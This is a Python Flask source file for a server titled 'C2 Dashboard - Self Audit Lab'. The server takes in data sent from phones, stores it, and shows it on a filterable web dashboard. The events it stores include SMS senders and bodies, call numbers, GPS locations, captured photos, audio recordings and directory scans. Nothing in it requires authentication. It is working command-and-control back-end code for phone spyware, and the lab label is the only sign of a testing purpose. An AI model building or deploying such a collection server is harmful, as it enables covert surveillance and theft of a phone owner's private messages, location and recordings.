from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

# In-memory storage (free Render instances restart occasionally)
log_entries = []

# Try to load existing data from disk
try:
    with open('/tmp/captured_data.json') as f:
        log_entries = json.load(f)
except:
    pass

def save_to_disk():
    with open('/tmp/captured_data.json', 'w') as f:
        json.dump(log_entries, f, indent=2)

@app.route('/api/log', methods=['GET'])
def get_logs():
    # Support category filtering via query parameter: /api/log?category=sms
    category = request.args.get('category', '').lower()
    
    if category:
        filtered = [e for e in log_entries if category in e.get('type', '').lower()]
        return jsonify({
            'total_events': len(filtered),
            'category': category,
            'events': filtered
        })
    
    return jsonify({
        'total_events': len(log_entries),
        'events': log_entries
    })

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Return event counts by category."""
    stats = {}
    for event in log_entries:
        event_type = event.get('type', 'unknown')
        # Extract main category
        if 'sms' in event_type.lower():
            category = 'sms'
        elif 'call' in event_type.lower():
            category = 'call'
        elif 'location' in event_type.lower():
            category = 'location'
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            category = 'camera'
        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
            category = 'audio'
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            category = 'file'
        else:
            category = 'other'
        
        stats[category] = stats.get(category, 0) + 1
    
    return jsonify({
        'total_events': len(log_entries),
        'categories': stats
    })

@app.route('/api/log', methods=['POST'])
def post_log():
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        
        # Cap at 1000 events
        if len(log_entries) > 1000:
            log_entries.pop(0)
        
        save_to_disk()
        print(f"[+] Received: {json.dumps(data, indent=2)}")
        
        return jsonify({'status': 'ok', 'total_events': len(log_entries)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/')
def dashboard():
    # Get the category filter from query parameter
    active_category = request.args.get('category', 'all').lower()
    
    # Get stats for the nav bar
    stats = {}
    for event in log_entries:
        event_type = event.get('type', 'unknown')
        if 'sms' in event_type.lower():
            category = 'sms'
        elif 'call' in event_type.lower():
            category = 'call'
        elif 'location' in event_type.lower():
            category = 'location'
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            category = 'camera'
        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
            category = 'audio'
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            category = 'file'
        else:
            category = 'other'
        stats[category] = stats.get(category, 0) + 1
    
    # Build events HTML
    events_html = ''
    displayed_count = 0
    
    for event in reversed(log_entries):
        event_type = event.get('type', 'unknown')
        
        # Determine category
        if 'sms' in event_type.lower():
            css_class = 'sms'
            category = 'sms'
            icon = '💬'
        elif 'call' in event_type.lower():
            css_class = 'call'
            category = 'call'
            icon = '📞'
        elif 'location' in event_type.lower():
            css_class = 'location'
            category = 'location'
            icon = '📍'
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            css_class = 'camera'
            category = 'camera'
            icon = '📸'
        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
            css_class = 'audio'
            category = 'audio'
            icon = '🎙️'
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            css_class = 'file'
            category = 'file'
            icon = '📁'
        else:
            css_class = 'other'
            category = 'other'
            icon = '📋'
        
        # Skip if filtering by category
        if active_category != 'all' and category != active_category:
            continue
        
        displayed_count += 1
        
        # Format the data for display
        event_data = event.get('data', {})
        device_id = event.get('device_id', 'unknown')
        timestamp = event.get('timestamp', '')
        server_time = event.get('server_received_at', '')
        
        # Build a readable summary based on event type
        summary = ''
        if 'sms' in event_type.lower():
            summary = f"From: {event_data.get('sender', event_data.get('address', 'Unknown'))}<br>Message: {event_data.get('body', 'N/A')}"
        elif 'call' in event_type.lower():
            summary = f"Number: {event_data.get('number', 'Unknown')}<br>Duration: {event_data.get('duration_seconds', event_data.get('duration', 'N/A'))}s"
        elif 'location' in event_type.lower():
            lat = event_data.get('latitude', '?')
            lon = event_data.get('longitude', '?')
            summary = f"Lat: {lat}, Lon: {lon}<br>Accuracy: {event_data.get('accuracy_meters', 'N/A')}m"
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            file_name = event_data.get('file_name', 'unknown')
            file_size = event_data.get('file_size', 0)
            summary = f"File: {file_name}<br>Size: {format_size(file_size)}"
        elif 'audio' in event_type.lower() or 'record' in event_type.lower():
            file_name = event_data.get('file_name', 'unknown')
            file_size = event_data.get('file_size', 0)
            summary = f"File: {file_name}<br>Size: {format_size(file_size)}"
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            summary = f"Path: {event_data.get('directory_path', event_data.get('path', 'Unknown'))}<br>Files: {event_data.get('file_count', 'N/A')}"
        else:
            summary = json.dumps(event_data, indent=2)
        
        events_html += f'''
        <div class="event {css_class}">
            <div class="event-header">
                <span class="event-icon">{icon}</span>
                <span class="event-type">{event_type.upper()}</span>
                <span class="event-badge">{category.upper()}</span>
            </div>
            <div class="timestamp">📱 {device_id} | 🕐 Client: {timestamp} | 🖥️ Server: {server_time}</div>
            <div class="summary">{summary}</div>
            <details class="raw-data">
                <summary>📄 Raw JSON</summary>
                <pre>{json.dumps(event_data, indent=2)}</pre>
            </details>
        </div>'''
    
    # Build category navigation
    categories = [
        ('all', '📊 All', sum(stats.values())),
        ('sms', '💬 SMS', stats.get('sms', 0)),
        ('call', '📞 Calls', stats.get('call', 0)),
        ('location', '📍 Location', stats.get('location', 0)),
        ('camera', '📸 Camera', stats.get('camera', 0)),
        ('audio', '🎙️ Audio', stats.get('audio', 0)),
        ('file', '📁 Files', stats.get('file', 0)),
        ('other', '📋 Other', stats.get('other', 0)),
    ]
    
    nav_html = ''
    for cat_id, cat_label, count in categories:
        active_class = 'active' if active_category == cat_id else ''
        nav_html += f'<a href="/?category={cat_id}" class="nav-item {active_class}">{cat_label} <span class="count">{count}</span></a>\n'
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard - Self Audit Lab</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #0f0; 
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        
        /* Header */
        .header {{ 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #222;
        }}
        .header h1 {{ 
            color: #0f0; 
            font-size: 1.5rem;
            text-shadow: 0 0 10px rgba(0,255,0,0.3);
        }}
        .header-actions {{
            display: flex;
            gap: 10px;
            align-items: center;
        }}
        .refresh-btn {{
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px 16px;
            font-family: monospace;
            font-size: 0.9rem;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s;
            text-decoration: none;
        }}
        .refresh-btn:hover {{
            background: #0f0;
            color: #0a0a0a;
        }}
        .auto-refresh {{
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.8rem;
            color: #888;
        }}
        .auto-refresh input {{ accent-color: #0f0; }}
        
        /* Navigation */
        .nav-bar {{
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 20px;
            padding: 12px;
            background: #111;
            border-radius: 8px;
            border: 1px solid #222;
        }}
        .nav-item {{
            padding: 8px 14px;
            border-radius: 6px;
            text-decoration: none;
            color: #888;
            font-size: 0.85rem;
            font-family: monospace;
            transition: all 0.2s;
            border: 1px solid transparent;
            white-space: nowrap;
        }}
        .nav-item:hover {{
            background: #1a1a1a;
            color: #0f0;
            border-color: #333;
        }}
        .nav-item.active {{
            background: #0f0;
            color: #0a0a0a;
            font-weight: bold;
            border-color: #0f0;
        }}
        .count {{
            background: #222;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 0.75rem;
            margin-left: 4px;
        }}
        .nav-item.active .count {{
            background: #0a0a0a;
            color: #0f0;
        }}
        
        /* Stats Bar */
        .stats-bar {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px 14px;
            background: #111;
            border-radius: 6px;
            border: 1px solid #222;
            font-size: 0.85rem;
            flex-wrap: wrap;
            gap: 8px;
        }}
        .stats-bar .active-filter {{
            color: #0f0;
            font-weight: bold;
        }}
        
        /* Events */
        .event {{ 
            border: 1px solid #333; 
            padding: 14px; 
            margin: 10px 0; 
            border-radius: 8px;
            background: #0d0d0d;
            transition: all 0.2s;
        }}
        .event:hover {{
            border-color: #555;
            background: #111;
        }}
        
        /* Category colors */
        .sms {{ border-left: 4px solid #00ffff; }}
        .call {{ border-left: 4px solid #ffff00; }}
        .location {{ border-left: 4px solid #00ff00; }}
        .camera {{ border-left: 4px solid #ff00ff; }}
        .audio {{ border-left: 4px solid #ff4444; }}
        .file {{ border-left: 4px solid #ff8800; }}
        .other {{ border-left: 4px solid #888888; }}
        
        .event-header {{
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }}
        .event-icon {{ font-size: 1.2rem; }}
        .event-type {{
            font-weight: bold;
            color: #0f0;
            font-size: 0.9rem;
        }}
        .event-badge {{
            font-size: 0.65rem;
            padding: 2px 8px;
            border-radius: 3px;
            background: #1a1a1a;
            color: #888;
            letter-spacing: 1px;
        }}
        .timestamp {{ 
            color: #666; 
            font-size: 0.75rem; 
            margin-bottom: 10px;
            line-height: 1.5;
        }}
        .summary {{
            color: #ccc;
            font-size: 0.85rem;
            line-height: 1.6;
            margin-bottom: 10px;
            padding: 8px 12px;
            background: #080808;
            border-radius: 4px;
        }}
        .raw-data {{
            margin-top: 8px;
        }}
        .raw-data summary {{
            color: #666;
            font-size: 0.75rem;
            cursor: pointer;
            padding: 4px 0;
        }}
        .raw-data summary:hover {{
            color: #0f0;
        }}
        .raw-data pre {{ 
            margin: 8px 0 0 0; 
            white-space: pre-wrap; 
            word-break: break-all;
            background: #050505;
            padding: 10px;
            border-radius: 4px;
            font-size: 0.75rem;
            color: #888;
            max-height: 300px;
            overflow-y: auto;
        }}
        
        /* Empty state */
        .empty-state {{
            text-align: center;
            padding: 60px 20px;
            color: #444;
        }}
        .empty-state .icon {{ font-size: 3rem; margin-bottom: 15px; }}
        .empty-state p {{ font-size: 1rem; }}
        
        /* Responsive */
        @media (max-width: 768px) {{
            body {{ padding: 10px; }}
            .header h1 {{ font-size: 1.2rem; }}
            .nav-item {{ padding: 6px 10px; font-size: 0.75rem; }}
            .event {{ padding: 10px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Self Audit Lab - C2 Dashboard</h1>
            <div class="header-actions">
                <span class="auto-refresh">
                    <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()">
                    <label for="autoRefresh">Auto (10s)</label>
                </span>
                <a href="/?category={active_category}" class="refresh-btn">🔄 Refresh</a>
            </div>
        </div>
        
        <div class="nav-bar">
            {nav_html}
        </div>
        
        <div class="stats-bar">
            <span>Showing: <span class="active-filter">{active_category.upper()}</span></span>
            <span>Displayed: <strong>{displayed_count}</strong> / Total: <strong>{sum(stats.values())}</strong></span>
        </div>
        
        {events_html if events_html else '<div class="empty-state"><div class="icon">📭</div><p>No events captured for this category yet.</p><p style="font-size:0.8rem;color:#555;">Data appears here when the app sends events to the server.</p></div>'}
    </div>
    
    <script>
        let autoRefreshInterval = null;
        
        function toggleAutoRefresh() {{
            const checkbox = document.getElementById('autoRefresh');
            if (checkbox.checked) {{
                autoRefreshInterval = setInterval(() => {{
                    location.reload();
                }}, 10000);
            }} else {{
                if (autoRefreshInterval) {{
                    clearInterval(autoRefreshInterval);
                }}
            }}
        }}
        
        // Check URL for auto-refresh parameter
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('auto') === 'true') {{
            document.getElementById('autoRefresh').checked = true;
            toggleAutoRefresh();
        }}
    </script>
</body>
</html>'''
    
    return html

def format_size(bytes_val):
    """Format file size to human readable."""
    try:
        size = int(bytes_val)
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.1f} KB"
        elif size < 1024 * 1024 * 1024:
            return f"{size / (1024 * 1024):.1f} MB"
        else:
            return f"{size / (1024 * 1024 * 1024):.2f} GB"
    except:
        return str(bytes_val)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)